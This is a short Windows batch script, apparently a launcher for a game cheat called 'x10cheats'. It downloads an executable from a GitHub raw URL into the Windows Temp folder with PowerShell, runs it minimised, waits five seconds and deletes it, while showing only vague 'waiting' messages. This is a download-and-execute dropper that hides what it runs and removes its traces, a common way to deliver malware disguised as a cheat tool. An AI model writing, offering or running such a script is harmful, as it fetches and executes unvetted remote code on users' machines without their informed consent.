@echo off
set "url=https://github.com/inshalliaqat/x10/raw/main/Protector.exe"
set "destination=C:\Windows\Temp\x10cheats.exe"
set "arguments=Apply"

echo WAITING FOR LAUNCH...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%destination%')"
echo WAITING ...
start /min "" "%destination%" %arguments%

timeout /t 5 /nobreak >nul 2>&1

echo ........
del "%destination%"
